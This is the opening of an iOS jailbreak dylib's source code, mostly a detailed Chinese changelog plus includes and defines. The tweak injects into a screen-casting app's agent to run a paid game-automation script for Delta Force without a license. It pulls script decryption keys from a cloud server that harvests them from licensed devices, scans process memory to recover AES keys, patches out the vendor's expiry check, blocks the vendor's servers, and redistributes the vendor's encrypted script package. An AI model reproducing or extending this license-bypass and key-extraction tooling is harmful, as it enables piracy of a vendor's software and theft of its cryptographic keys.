//       ② 三条触发：A 崩溃签名 + run=0 st=0 ｜B run=1 st=0 持续 45s ｜
//          C 静默停摆 st=0 run=0 且 sjz 停写 ≥600s（装包/重启后的主路径，
//          因为新进程 last_run 初值 0，看不到 1->0）。
//       ③ 抑制矩阵：卡封禁 / 心跳未授权 / 用户停闸门 / 中控停证据 / killswitch 冷却 600s /
//          厂商杀冷却 900s（stop 紧邻 recv auth failed）/ 退避未到 / GIVEUP / 启动静默 180s / probe。
//       ④ 退避：0/60/120/300/600s，连败 5 次 GIVEUP，静默 1800s 后再给一轮；
//          **必须跑稳 300s 才清失败计数**（只看「起来了」会被崩-拉循环钻空子）。
//       ⑤ 顺带修：killswitch 自己 STOP 造成的 run 1->0 会被 v6.24k 误判成「用户主动停」
//          并落 .bs_userstop（7 天 TTL）→ 心跳恢复后永久躺平。这是历史上「停了就再也不动」
//          的一条隐蔽成因。
//       ⑥ `[cr] stall scan` 追加 `ar=<armed>/<att>/<stop_kind>`，远程一眼分清
//          「没授权 / 退避中 / 已放弃」。
//       ★ 全 dylib 唯一 OPER_START 调用点 = [ar] 块（grep 可验证），不再有无条件拉起。
//
// v6.24p ★★★ 删除一切「自动运行脚本」（2026-10-20，用户指令：除「脚本本来在跑」
// v6.24q ★★★ [rl] so_sync 自动重载整体移除（用户指令：新 so 只落盘，脚本由人工
//       手动运行时加载）——核对 v6.24p 时发现 reload 的 STOP→START 窗口内用户点停止
//       会被 g_reload_busy 屏蔽判据而漏检，与其补丁不如干脆删掉整条自动 START 路径。
//       至此全 dylib OPER_START 归零：任何代码路径都不再运行脚本。so_sync 下载/
//       校验/修复保留（纯落盘），verwatch 按盘上版本预铺密钥（手动运行即可解新包）；
//       conf autoreload= 键仍解析但无动作点（同 crashresume 先例）。
//       与「中控手动下发运行」外，其余一律不得自动运行脚本）：
//       ① [hg] 假运行看门狗（v6.24m/n）整块删除 —— OPER_STOP→OPER_START 自动重启；
//       ② [cr] 崩溃签名自动 OPER_START 删除 —— 崩溃只落证据 + 节流日志，原地停住等人点；
//       ③ [cr] 停摆/空闲兜底自动 OPER_START 删除 —— 只留 5 分钟诊断快照；
//       ④ [cr] cr_pending 重试状态机（含会话死冷启 App 升级）整块删除；
//       ⑤ [rl] so_sync 自动重载加守卫 —— 脚本没在跑（run==0）时不下发 START，
//          新 so 留盘上，下次手动运行自然加载；脚本在跑才允许 STOP→START 换包。
//       保留：崩溃签名扫描与 .bs_cr_pending 证据落盘（纯观察）、[cr] stall scan 诊断
//       快照、用户停止闸门 .bs_userstop（继续压制 [rl]）、[fg] 前台看门狗（只拉游戏
//       回前台，不碰脚本）、crashresume conf 键仍解析但不再有任何动作点。
//
// v6.24o ★★★ `crashresume=0` 真正接线（2026-10-20，用户要求撤销 func-nil 静默化）：
//       背景：`g_crashresume` 自 v6.17 起只被解析、从未被任何判断使用 —— 是死配置。
//             撤销 beta.so 硬化后，func-nil 崩溃会重新出现（这是用户要的「可见」），
//             但若 [cr] 15s 内自动拉起，中控只闪一下、人还是看不见。
//       修法：把 g_crashresume 接进全部 5 个自动拉起入口 ——
//             ① 崩溃签名动作闸门 gate_ok；② 加载失败挂 pending；
//             ③ 停摆/空闲兜底；④ [hg] 假运行看门狗；⑤ cr_pending 重试状态机。
//       效果：conf 写 `crashresume=0` → 设备崩溃后**原地停住**，日志留
//             `[cr] ★ crash CONFIRMED ... kept STOPPED on purpose, press Run in center`，
//             中控显示未运行，人工点「运行」即恢复（点起来后 pending 自行清）。
//             诊断行新增 `ar=` 字段。默认仍为 1（自动恢复），不影响存量设备。
//
// v6.24n ★ 判据放宽：不要求 st!=0（卡死时容器指针可能已被清 0，run 仍为 1）。
//
// v6.24m ★★★ 「中控显示运行中、实际脚本不动」根治（2026-10-20，.2080 设备 c42a8474… 实锤）：
//       现象：设备 run=1、agent 心跳 2min 一拍正常，中控显示脚本在跑，但游戏画面不动 6 小时。
//       证据：sjz.log 最后一行 02:20:18 `[长弓溪谷] find pickup icon first` 之后再无输出；
//             sreen.log（截图/投屏通道）从 02:25:51 起只剩 "socket no data recv:1,35"；
//             agent.log 无 `run script error`，run 标志始终 1。
//       结论：脚本线程卡在截图/找图调用上无限等待 —— 不是崩溃（[cr] 看不见），
//             也不是停脚本（run 不为 0，idle 兜底看不见），两套自愈全部失明。
//       修法：新增 [hg] 假运行看门狗 —— run==1 && st!=0 && sjz 停写 ≥900s 且无用户停止闸门
//             → OPER_STOP（打断卡死线程）→ 1.5s → OPER_START，并接管 cr_pending 继续重试；
//             两次之间 1800s 冷却；期间用 hg_busy_until 屏蔽 `run 1->0` 误落用户停止闸门。
//
// v6.24l ★ 闸门判据收紧（同日，.216 装 1.64 后 15 分钟实测驱动）：
//       ① `begin process operate script msg` 撤出停止判据 —— 它是中控「操作消息」的
//          统一入口（点运行同样走它），拿它判停止一旦厂商改用它下发运行就会反锁。
//          改只认 `agent stop script` / `begin process stop script msg`。
//       ② marker 写入加「sjz 新鲜度 ≤300s」前提 —— App 冷启时厂商 run 标志残留为 1、
//          初始化后掉 0 也会构成 1->0 假信号，老写法会误落闸门 → 装完包静默躺平。
//       实测（21:01 .216）：装 1.64 后 `[cr] stall scan ... us=1` —— 闸门按「用户 20:53
//       确实点过停止」正确生效，脚本没有被兜底拉起（这正是要的行为）。
//
// v6.24k ★★★ 「中控停脚本又被自动拉起」根治（2026-10-19，.216 实锤，deb ≥1.60）：
//       现象：中控点「停止」→ 20:53:00 agent stop script → 20:53:29 dylib 自己发
//             OPER_START → 20:53:36 用户再点停止。停止事件被反复对抗。
//       根因（两条叠加，缺一不成立）：
//             ① `bs_last_stop_is_user` 判据串写错：写的是
//                "begin process stop script msg"，而厂商真实日志是
//                "begin process operate script msg!"。设备实查：错误串 0 次、
//                正确串 4 次 → 该函数**恒返回 0**，用户停止永远识别不出来。
//             ② 判据只作用于 idle 分支，`stalled` 分支（marker / run-error 证据）
//                完全不看用户停止；且窗口只有 64KB，agent.log 每 20s 写 3 行，
//                半小时后停止痕迹早被挤出窗口。
//             → 于是 idle 兜底（CR_IDLE_SECS=600）在停止后第一拍扫描就直接拉起。
//       修法：
//             (a) 新增**落盘闸门** `.bs_userstop`：观测到 run 1->0（非 reload、
//                 非卡封禁）立即写；App 重启 / 日志轮转都不影响。
//             (b) 闸门存在期间禁止**一切**自动拉起：idle 兜底、stalled 兜底、
//                 崩溃重试状态机、so_sync 自动 reload。[fg] 本就要 run=1，天然不触发。
//             (c) 解除只有一个条件：再次看到 run==1（= 中控真的下发了「运行」）。
//             (d) 优先级：崩溃证据 > 用户停止。扫到 run-error / loadfail 签名时
//                 撤销闸门走恢复（那是「中控下发的 run 执行后崩了」，不是人工停）。
//             (e) 停止判据串修正为 operate/stop/agent-stop 三种，窗口 64K→256K。
//       配套：给 `[cr] stall scan` 诊断行加 us= 字段，现场一眼看出是否被闸门挡住。
//
// v6.24j ★★ 「装完不代启」三处盲区（2026-10-19，.98 装 probe 包实锤）：
//       现象：.98 装 v1.60-probe 后 App 确实冷启了，但日志**一条 [autosvc] 都没有**，
//             服务没被点起来（.216 那种「[autosvc] no marker / tapped OK」也没有）。
//       根因（三条都成立，缺一即失效）：
//             ① **dylib 不重新 load**：dyld 共享缓存已映射的同路径 dylib，装完覆盖文件后
//                新进程仍用旧缓存映射 → +load/constructor **根本不跑**，所以连日志都没有；
//                原本靠「装包→killall App→uiopen」触发重新映射，但若 App 启动太快 / 系统
//                把它留在后台，就不成立。
//             ② **UI 未就绪**：os_kickoff 立刻起 2s 拍定时器，冷启时 UIWindow 可能还没建，
//                命中判定永远拿 nil；60 拍（2min）耗尽后放弃，标记留着等下次 —— 但下次
//                又是同一时序，容易永远点不到。
//             ③ **只在进程启动那一刻看标记**：装包时 App 已在后台（未被 kill 或被杀后
//                被系统恢复），再切回前台也不会重查标记。
//       修法（都在 App 进程内，probe/unlock 通用）：
//             (a) bootstrap 里先**轮询等 UI 就绪**（最多 60s，1.5s 一拍）再 kickoff；
//             (b) 订阅 `UIApplicationDidBecomeActiveNotification` —— 每次激活都重查
//                 `.autosvc_pending`，有就再 kickoff（消费后自动 no-op）；后台线程注册，
//                 不碰冷启动期 dyld/ObjC；
//             (c) as_tick 每拍先查标记是否还在（被别的 kickoff 消费则收尾），
//                 g_as_busy 防重复 kickoff 起两套定时器。
//       配套（本轮已做）：probe 包 postinst **补写** `.autosvc_pending`（原来只有 unlock
//       写）；装包后务必 killall App + uiopen 冷启一次，否则 ① 无法绕过。
//
// v6.23n ★★ 脏容器自愈（2026-10-05，外网机 nm=1005「加载运行库出错」实锤驱动）：
//       厂商通道会给 App 拉到捆了**无键远古段**的变体容器（12 段 7 无键，
//       md5 57076b29），App 加载运行库解密失败 →「加载运行库出错」。
//       云端 probe 分发的同版本号包是干净的（7 段全键），两包尺寸可能相同
//       → so_sync「只升不降」永远不触发，设备永久卡死。
//       修法：/ver 版本一致时也验容器健康 —— 逐段版本查键（字典已有零开销；
//       缺 → 云端 /key bypass 现查），确认「字典+云端都无键」的段存在 →
//       按当前版本号重拉干净包覆盖（键闸门 v6.18 同款，闸门不过不落盘），
//       修复冷却 1h 防打爆。特征串 "dirty container" / "container repaired"。
//
// v6.23o ★★ md5 强制比对自愈（2026-10-05 深夜，1005 修复后 2h 内再坏驱动）：
//       v6.23n 只能抓「无键段」型脏容器；实测厂商通道/App 会在同版本号下
//       整包换载荷（1005 20:21 人工覆盖干净包 → 22:47 又报 Lua '—' 编译错），
//       变体可以全键但内容坏，键体检永远过。云端 /ver 应答本就带 md5 字段
//       （script_latest 已算好）——版本一致时再比 bs_md5_file(本地 beta.so)：
//       不一致 = 本地被换包 → 直接按云端 md5 重拉（下载体 md5 也必须命中
//       才落盘，防中继缓存陈旧包来回打架），冷却沿用 1h。
//       特征串 "md5 mismatch" / "md5 verified"。
//
// v6.23p ★ dylib 版本号随心跳上报（2026-10-06 凌晨，舰队全量铺装驱动）：
//       devlog 回传后被服务端裁到尾部 8KB，启动期 [conf] 行十几分钟即滚掉
//       → 云端无法判断某台设备跑的是哪版 dylib（1005/8128 都识别不出）。
//       修法：#define BS_DYLIB_VER 版本常量，/hb（与 /manifest）query 追加
//       &dv=<ver>；服务端解析入库、设备表「型号/系统」列直接显示。心跳
//       ping 行每 tick 都带 dv=，8KB 尾部永远看得到 → 全量铺装装一台亮一台。
//
// v6.23q ★ keyhunt 进程内存密钥找回（2026-10-11 凌晨，030009 密钥断供驱动）：
//       厂商 3.0.9 起改密钥送达方式：脚本解密密钥不再进 _g_script_mushroom_head
//       字典 → probe 每拍 "not in dict yet"，云端 keys.json 永远等不到 030009
//       （.71 实测：sjz.log 横幅在跑 3.0.9、mh dict 仍 n=8）。但密钥在脚本
//       解密那一刻必经本进程内存 → probe 线程在字典缺失时扫全部可读内存，
//       用盘上 beta.so 的【ver==目标】type=1 段密文做 AES-256-ECB 试解：
//       粗筛 zlib 头 + 精验 libcompression 解压 == nl+cl 且 name 可打印。
//       命中注入 g_mh_snap 走常规 BSPR 上报 → 云端入库 → 全网跟版恢复。
//       纯 C AES 表运行期生成（FIPS-197 自检失败即禁用），零 CI 链接改动。
//       特征串 "keyhunt" / "FOUND ver="。
//
// v6.23s ★ 卡密「后输入者得」落地（2026-10-13 用户拍板，配套 bsmod v3.10）：
//       ① 激活请求（卡变更分支）body 加 "act":"new" —— 卡已被他机绑定时服务端
//          直接改绑（接管），原持有方下次心跳收 code=7；
//       ② code=7 处理：清 g_card_cur/expire/lastok + cache_save（bs_card.txt 卡号
//          清空）+ 本地拉黑该卡（g_card_kicked）——拉黑是防振荡关键：被踢设备
//          卡源（日志捕获/内存）会自动重灌同一张卡，若不拉黑将以 act=new 抢回
//          → 与接管方 60s 心跳互踢死循环；拉黑后静默停脚本等真输入（换卡或
//          重启 App 清拉黑）。心跳 code=7 同样拉黑（本机卡被别机接管场景）。
//       ③ 激活成功清拉黑。特征串 "taken over" / "act"。
//
// v6.23v ★ App 进程首启自动点「启动服务」（2026-10-14）：
//       需求（用户）：装完新 bspath 后模拟人工「打开 App → 点启动服务」，每次新版本只执行一次。
//       前提：filter plist 扩为 Agent+App 两个 Executable（原只注 Agent，App 进程 dylib 不加载）。
//       机制：
//             ① postinst 装 dylib 后写标记 $DATA/.autosvc_pending（内容=版本号），再冷启动 App；
//             ② App 进程内 bs_bootstrap 顶部判进程名（_NSGetExecutablePath）= App →
//               若标记存在 → performSelectorOnMainThread 起 NSTimer（2s 一拍，最多 20 拍）；
//             ③ 每拍递归扫 UIWindow 树找 title/accessibilityLabel 含「启动服务」的 UIButton，
//               命中即 sendActionsForControlEvents:UIControlEventTouchUpInside（等价真人手点，
//               走 App 自己的启动链路，会话协商天然齐全 —— v1.49 nohup 直拉 recv rep key failed 的根）；
//             ④ 点击成功 → 标记改名 .autosvc_done_<ts> → 本次安装生命周期内不再执行；
//               20 拍没找到（UI 慢/文案变了）→ 留标记，下次开 App 再试，最坏退化为手点。
//       App 进程内其余全跳过：bs_block_init 不装（constructor 判进程）、bs_find_base/注入/
//       心跳/pull 均不跑（Agent 专属），bs_log 打 [autosvc] 前缀进同一日志。
//
// v6.23u ★ crash-resume 签名放宽 + 扩扫 sjz.log + cardtick 300→120（2026-10-14）：
//       背景（用户报「部分机器跑着跑着停，中控显示 string"UNKONW = 0 IPHONE_8P = 1
//             ANDROID = 2 function.."]:1: attempt to call local func (a nil value)"）：
//             即 v6.17 处理过的 wait_call_func 4~5h 热更新崩溃，但部分机器仍漏拉。
//       三个缺口：
//             ① 签名只匹配带引号格式 `local 'func'` —— 中控显示为无引号 `local func`，
//               不同机型 lua/日志格式差异会漏匹配 → 双格式都收；
//             ② 只扫 agent.log —— 错误也可能落 sjz.log（脚本层日志）→ 两文件都做
//               增量扫描（基线各自独立，命中任一即走恢复判定）；
//             ③ 老版本 dylib（v6.17 之前）根本没有 crash-resume → 出 v1.51 deb
//               统一升级内嵌 v6.23u。
//       另：cardtick 缺省 300→120（v6.20 注释同改），code=7 被踢感知最长 5 分钟→2 分钟。
//
// v6.23t ★ 拉黑落盘 + 真输入判定（2026-10-13，堵重启抢回窗口）：
//       问题：v6.23s 的 g_card_kicked 只在内存 —— 被踢机重启后拉黑丢失，而
//       agent.log 尾部 64KB 扫描（无 offset）仍能抓到同一卡号 → 以 act=new 抢回
//       → 与接管方 60s 心跳互踢振荡。
//       修法：① bs_card.txt 追加 kicked= / kickts= 两行，随缓存落盘与读回；
//             ② 解除拉黑须「真重新输入」= 捕获到行首 [Y/M/D H:M:S] 时间戳
//                晚于 kickts 的激活日志行；旧日志残留时间戳必 ≤ kickts，不算。
//       效果：被踢机不换卡/不重新输卡 → 重启后依旧静默封禁，绝不抢回。
//       特征串 "kicked=" / "newer input seen after kick"。
//
// v6.23r ★ 修复 net block 快扫路径 bug（2026-10-11 深夜，.71 真卡卡大厅驱动）：
//       bs_block_init 快扫读的是 DATA_DIR/bs_pull.conf（App 数据目录，不存在）
//       → fp=NULL → bv 缺省 1 + mode 空 → probe 真卡机例外**从未生效**，
//       每次启动都装 block；Agent 长连接 22:12 断线重连时 DNS 被自己拦死
//       （vps.beibeiplay.com blocked），脚本失联卡大厅。改为先读 PULL_CONF
//       （Media 根真实 conf），读不到回落 DATA_DIR（兼容历史放置）。
//       特征串不变："blockvps=0 -> net block skipped"。
//
// v6.23o ★★ md5 强制比对自愈（2026-10-05 深夜，1005 修复后 2h 内再坏驱动）：
//       服务端零改动（/ver 的 md5 字段 v3.x 就有）。
//
////
// ── v3 闸门问题（已实证） ────────────────────────────────────────────
// _bb_load_script (vmaddr 0x10000c1bc) 入口：
//     0x10000c1f0  ldr  x8, [x26, #0x48]     ; g_lua_state @ 0x100053048
//     0x10000c1f4  cbz  x8, 0x10000c200      ; == 0 才继续加载
//     0x10000c1f8  mov  w22, #-1             ; != 0 直接 return -1，不打任何日志
// 脚本一旦加载过（state 非 0），再点中控「运行」就静默失败 —— 界面完全没反应。
// 看门狗策略：每 2s 采样，state != 0 且 _g_bb_script_run (0x100053095) == 0，
// 连续 5 次（10s）→ 判僵死 → 调 _set_user_script_operate(1)，交给产品自己收尾。
//
// ── v4 本地模块注入 ──────────────────────────────────────────────────
//     function wait_call_func(func, name, ...)
//         local status, ret1.. = pcall(func, ...)
//         if status then return ret1, ret2
//         else
//             while true do
//                 if waitCallModule(name) then
//                     func = load("return "..name)()
//                     return func(...)
//                 else mSleep(1000) end
//             end
//         end
//     end
// 下发落地函数（唯一写入点）：
//     _bb_I7FSMHXZCP(0x1000159e0) → _set_script_onion_data(0x100004914)
//     _set_script_onion_data(NSString *name, NSString *code)
//         → dict[0x1000532c0][name] = code        （NSMutableDictionary）
// ⇒ 我们把本地模块源码按同样方式塞进 dict，产品自己的流程就会加载它。
// ★ 实测（2026-09-26，.47）：字典的 value 类型是 NSData，不是 NSString。
//
// ── v5 路线 A（PC 拉取） ─────────────────────────────────────────────
// app.plist 路径（App 视角）：/var/mobile/Media/BetaScreenTYMDESUJCX8T/app.plist
//   内容： <?xml ...?><plist version="1.0"><dict><key>ip</key><string>192.69.0.24</string></dict></plist>
//   来源：App 里手输 → 写盘。官方 deb 的 preinst 会刻意保留它。
//   ⇒ 它就是「设备找 PC 中控」的天然入口，v5~v6.1 直接复用它。
//   ★★ v6.2 起本补丁**不再读它**（它归 App/中控，用户自己维护），
//      服务端地址改为内置 + conf 可选覆盖，详见 BS_HOST_DEF 注释。
//
// ── v6.3 密钥云端化（2026-09-28） ────────────────────────────────────
// 以前 kKey/kVal 是编译期硬编码（020909 + 32B 密钥）。脚本升到新版本后
// （如 3.0.0，版本键 = 030000），Agent 在 _g_script_mushroom_head 里查不到
// 对应版本 → "can not find version key!!" → 脚本挂；而免卡密机永远拿不到
// 卡密服务器下发的新密钥 → 过去只能改源码 + 重跑 CI + 重新部署 dylib。
//
// 现在：bootstrap 先 bs_load_conf()，再 bs_inject_mh()：
//   1) 读本地 beta.so 头 4 字节 → 版本 hex（02 09 09 -> "020909"）
//   2) GET /key?prj=sjz&ver=<hex>[&key=<设备码>] → 35B（3B 版本号 + 32B 密钥）
//   3) 注入 _g_script_mushroom_head；失败才回退内置 kKey/kVal
// ⇒ 脚本升级后**无需重编译 dylib**，只要云端密钥库有该版本即可。
//   云端密钥来源：真卡机 dump（_patched/dump_mhkey.py、
//   _patched/watch_upgrade.py 会自动检测版本变化并上架）。
//
// 编译（macOS + Xcode CLI）
// ------------------------
//   xcrun --sdk iphoneos clang -arch arm64 -dynamiclib -O2 -miphoneos-version-min=13.0 \
//     -framework Foundation -install_name @rpath/bs_unlock.dylib -o bs_unlock.dylib bs_unlock.m

#import <Foundation/Foundation.h>
#import <mach-o/dyld.h>
#import <pthread.h>
#import <objc/runtime.h>
#include <string.h>
#include <unistd.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <ctype.h>
#include <errno.h>       // ★ v6.3：bs_read_beta_ver 的 errno 诊断
#include <sys/mman.h>    // ★ v6.23：mprotect（运行时中和厂商 valid_time setter）
#include <spawn.h>       // ★ v6.24d：冷启 App / uiopen 用 posix_spawn（rootless 无 /bin/sh，system() 不可用）
#include <signal.h>      // ★ v6.24d：posix_spawnattr sigmask
extern char **environ;   // ★ v6.24d：posix_spawn envp
#include <mach/mach.h>   // ★ v6.23b：mach_task_self + vm_allocate/vm_remap/vm_deallocate
// ★ v6.23q：iOS SDK 不提供 <mach/mach_vm.h>（头里直接 #error），但符号在
//   libsystem_kernel 里齐全 —— 手动 extern 声明即可（keyhunt 扫内存用）。
extern kern_return_t mach_vm_region(vm_map_t target_task,
                                    mach_vm_address_t *address,
                                    mach_vm_size_t *size,
                                    vm_region_flavor_t flavor,
                                    vm_region_info_t info,
                                    mach_msg_type_number_t *infoCnt,
                                    mach_port_t *object_name);
extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task,
                                            mach_vm_address_t address,
                                            mach_vm_size_t size,
                                            mach_vm_address_t data,
                                            mach_vm_size_t *outsize);
// ★ iOS SDK 不允许 mach_vm.h（"mach_vm.h unsupported"）→ 用 legacy vm_* 系列
//（vm_address_t 在 arm64 上就是 64 位，行为等价，ellekit 设备侧同款用法）
#include <mach/vm_statistics.h> // ★ v6.23b：VM_FLAGS_ANYWHERE / VM_FLAGS_OVERWRITE
#include <mach/vm_inherit.h>    // ★ v6.23b：VM_INHERIT_COPY
#include <libkern/OSCacheControl.h> // ★ v6.23：sys_icache_invalidate
#include <dirent.h>      // ★ v6：扫模块目录（抹除 .lua）
#include <sys/sysctl.h>  // ★ v6.10：设备名/型号/系统版本上报
#include <dlfcn.h>       // ★ v6.20：dlsym 解析 Agent 卡密 getter
#include <sys/socket.h>  // ★ v6.19：厂商服务器进程内屏蔽
#include <sys/time.h>    // ★ v6.25e：SO_RCVTIMEO 的 struct timeval（桩接收超时）
#include <sys/select.h>  // ★ v6.45：备注上报的非阻塞 connect 超时（select）
#include <netinet/in.h>  // ★ v6.19
#include <arpa/inet.h>   // ★ v6.19：inet_addr/ntohs
#include <netdb.h>       // ★ v6.19：getaddrinfo/EAI_NONAME
#import "fishhook.h"     // ★ v6.19：facebook fishhook（rebind_symbols）

#define AGENT_NAME "BetaScreenTYMDESUJCX8TAgent"

// ---- 全局偏移（vmaddr - __TEXT(0x100000000)）
#define OFF_MH        0x53020   // _g_script_mushroom_head (NSDictionary*)
#define OFF_STATE     0x53048   // _g_lua_state (lua_State*)，加载闸门
#define OFF_RUN       0x53095   // _g_bb_script_run (u8: 1 = 脚本运行中)
#define OFF_ONION_DICT 0x532c0  // onion 模块字典 (NSMutableDictionary*: name -> code)
#define OFF_RS_1A8    0x531a8   // 脚本状态码 (int32)

#define FN_SET_OPER   0xd8a0    // void _set_user_script_operate(int)
#define FN_SET_ONION  0x4914    // void _set_script_onion_data(NSString *name, NSString *code)

// 0 = 启动  1 = 停止  4 = 重启
#define OPER_START     0    // ★ v6.7：启动（等价于「点运行」）
#define OPER_STOP     1
#define OPER_RESTART   4    // ★ v6.7：产品「重启」语义（反汇编推断，未实测；本版未采用）

#define WD_TICK_SECS    2
#define WD_STALE_TICKS  5       // 5 * 2s = 10s 判定僵死

// ★★★ v6.36：模块盘面同步限速（秒）。
//   216 实证（2026-10-22 21:05:26）：state change 注入时盘上只有 2 个 lua
//   （task_lhdb_into 正被改名成 .missing），注入 n=2；1 秒后真模块被 cp 回来，
//   但 dict/st 指针都没再变 → 永远不会重注入 → 脚本缺模块白卡 302 秒才崩，
//   崩完 resume 第二次才拿到 n=3。puller 补模块、用户手动丢模块同理。
//   修法：注入后记住 n，每拍比对盘上 .lua 个数，盘面数字一变就补注一次。
#define MOD_SYNC_SECS   10

// ★ v6.7：落盘后自动重启的状态机相位与超时上限 —— ★ v6.24q 已随 [rl] 整体移除
//   （新 so 只落盘，脚本手动运行时加载；conf autoreload= 键仍解析但无动作点）

// ★ v6.17：func-nil 崩溃自动恢复（crash-resume）—— ★ v6.24p 已按用户指令移除全部
//   自动恢复动作，仅保留签名扫描做证据落盘与诊断日志（见下）。
// ★ v6.24c：加载期失败也纳入自愈 —— 签名扩到 `can not find version key` /
//   `load snail module failed`（10-17 .115 装 v1.56 后冷启：「加载运行库出错」）。
//   该类失败发生在「中控上线 4s 就补发 run、而 dylib 还没铺完全部段版本键」的
//   窗口内（实测键 17:45:19.7 才齐，加载 17:45:18 已失败），键齐后重试必成。
//   同时把 init 阶段改成「同步预铺全部版本键」（见 bootstrap 1a-2），把窗口压到 ~1s。
//   闸门对 loadfail 不要求 saw_run（run 可能已回落而 saw_run 尚未置位）。
// ★ v6.24b/d：崩溃恢复「重试状态机 + 会话死升级冷启 App」—— ★ v6.24p 已整块删除。
#define FG_STALE_SECS   180     // ★ v6.24d：sjz.log 停摆判定（秒）
#define FG_MIN          600     // ★ v6.24d：[fg] uiopen 游戏限速（秒）
#define CR_STALL_SCAN   60      // ★ v6.24p：停摆扫描周期（秒）——现仅用于诊断快照
#define FG_GAME_BID     "com.tencent.tmgp.dfm"   // ★ v6.24d：三角洲行动（DeltaForceClient.app）

// ★ v6.8：大文件（beta.so ~1.16MB，上限 8MB）下载专用长超时。
//   弱网实证（2026-09-28，111.172.x 两台）：共用 6s/8s 超时 → 每次下载 8s 被掐、
//   0 字节到手（NSURLErrorTimedOut=-1001）→ bad size 0 abort，永不落盘。
//   request 超时 = 无数据空闲上限（有数据流动就续命）；resource = 整请求总预算。
#define SO_DL_TMO_REQ   60      // 空闲 60s（正常传输会不断重置）
#define SO_PORT_DEF     27391   // ★ v6.12：中继（BSModuleServer）默认端口，conf 无 soport 时用
#define SO_DL_TMO_RES   300     // 总预算 5 分钟（8MB @ ~27KB/s 也够）

#define MOD_DIR_DEF "/var/mobile/Media/bs_modules"
#define DATA_DIR  "/var/mobile/Media/BetaScreenTYMDESUJCX8T"

// bs_log 的落盘路径（纯 POSIX 写，禁 ObjC；理由见 bs_log 注释）
// 注意：dylib 跑在 Agent 进程内，此处 /var/mobile/Media 即 Dopamine jbroot 下的
// 真实 Media（shell 侧要加 /var/lib/.jbroot/rootfs 前缀才看得到同一个目录）。
#define BS_LOG_PATH "/var/mobile/Media/bs_unlock.log"

// ★ v6.24r：独立事件日志 —— `[us]` / `[cr]` / `[so]` / `[wd]` 这些「决策级」事件
//   单独写一份、单独走 &src=evt 上报通道。动机（10-20 三台实锤）：
//   主日志被 `[pull] step1~5` + `recv rep key failed` 高频淹没，8KB 窗口只剩 6~12 分钟，
//   崩溃/停止现场 10 分钟内就被冲干净，远程永远只能看到「停了」，看不到「为什么停」。
//   本文件只记关键事件、增长极慢（几十条/天），8KB 能覆盖数周。
#define BS_EVT_PATH "/var/mobile/Media/bs_evt.log"

// ★ v6.24r：运行库（beta.so）生效状态 —— 解决「落盘 ≠ 生效」无法远程判读。
//   格式一行：md5=<32hex> size=<n> disk=<epoch> pend=<0|1> applied=<epoch>
//   pend=1：新 so 已落盘但脚本还在跑内存里的旧 so（下次手动运行才生效）。
//   watchdog 观察到 run 0->1 时把 pend 清 0 并写 applied。
#define BS_SO_STATE_PATH DATA_DIR "/.bs_so_state"

// ---- v5：路线 A（PC 拉取）
#define PULL_TICK_SECS   300    // 每 5 分钟检查一次更新
// ★★★ v6.39：网络失联后的快速重试（断网恢复能被更快发现）
#define HB_FAST_SECS     20     // 快速重试间隔
#define HB_FAST_RETRY    6      // 最多快速重试几次（6×20s=2min），之后退回 g_tick
#define PULL_FIRST_DELAY 3      // 启动 3s 后第一次拉（调试期缩短，便于快速观察）
#define PULL_TIMEOUT     6      // 单请求超时（秒）
#define PULL_PORT_DEF    8080   // PC 端 bs-module-server 默认端口
// 可选：与 PC 端 --token 对应。留空则不鉴权。
// 也可在设备上写 /var/mobile/Media/bs_pull.conf 覆盖（见下）。
#define PULL_TOKEN_DEF   ""

// ---- v6.2：服务端地址**内置**，不再读 app.plist
//
//   ★★ 重要（2026-09-27 现场教训）：
//   `/var/mobile/Media/BetaScreenTYMDESUJCX8T/app.plist` 里的 `ip` 是
//   **贝塔投屏 App 自己连「电脑中控」用的**（用户在 App 里手填的 PC IP），
//   跟 bspath 补丁**不是一回事**。v6.1 及以前 dylib 直接抠这个 ip 当服务端地址，
//   于是「中控 IP」和「模块/心跳服务端 IP」被绑死在同一份文件上——
//   服务端迁到公网后二者必然冲突（改一个就弄坏另一个）。
//
//   → v6.2 起：默认直连 BS_HOST_DEF（公网模块服务端），**完全不碰 app.plist**。
//     需要临时换服务端时，在 bs_pull.conf 写 `host=1.2.3.4` 即可覆盖（无需重编译）。
#define BS_HOST_DEF "47.116.161.226"   // ★ v6.16：云端迁移（老 47.243.156.129 弃用）

// ★ v6.3：脚本项目名（beta.so 记录 0 里的 prj_name），云端 /key 查密钥用。
//   只有换脚本项目（sjz 之外）才需改这里；版本升级不需要。
#define BS_PRJ "sjz"

// ---- v6：心跳授权（"心跳即死亡"）。
//   BSModuleServer 每次 pull 时用 /hb 端点返回授权；连续拿不到 -> 判定失联 ->
//   执行 OPER_STOP 停脚本 + 抹掉本地模块，使脱离 PC 服务的环境完全不可用。
//
//   ★ v6.1：网络类失败计数容忍（`hbmiss=` 可运行时覆盖），
//     授权类拒绝（403 / "ok":false）仍**立即**判死，不走计数。
#define HB_MISS_MAX_DEF  3      // 默认连续失败 N 次判失联（N * tick 秒）
#define HB_PATH          "/hb"

// ★★★ v6.4：probe 模式（真卡机「密钥 / 版本雷达」）。
//
//   背景：真卡机（有卡密、能正常与卡密服务器握手）升级脚本后，云端密钥库需要
//   第一时间拿到新版本密钥，否则免卡密机一旦跟着升级就会 `can not find version key!!`。
//
//   做法：真卡机也装本 dylib，但 conf 写 `mode=probe`，此时：
//     ① 不注入密钥（App 自己会从卡密服务器拿，注入反而多此一举）
//     ② 不起心跳 watchdog（不参与我们的授权，避免真机被云端策略误伤）
//     ③ 不 pull 模块（不动真机业务）
//     ④ 不打任何 Agent 补丁（deb --mode probe 会跳过五点补丁）
//   只做一件事：发现本地 beta.so 版本变化后，把「该版本解密密钥 + beta.so 包」
//   POST 到云端 /probe，供免卡密机 GET /key 与 /script/beta.so 自动取用。
//
//   ⇒ 真卡机行为零改变，只多一个只读线程 + 偶发上行流量。
#define PROBE_PATH       "/probe"
#define PROBE_TICK_SECS  600    // 复查间隔（已上报成功则静默等待）
// ★ v6.5：版本哨兵间隔。官方下包后约 12s 就重载脚本，puller tick(300s) 来不及补键，
//   所以单独用 3s 的高频纯 C 探测（只读 4 字节，开销可忽略）。
#define VERWATCH_TICK_SECS 3
// ★ v6.5：新版本密钥云端还没上架时的重试节流（N 个 tick 试一次；10 * 3s = 30s）。
#define VERWATCH_RETRY_EVERY 10
#define MODE_UNLOCK      0
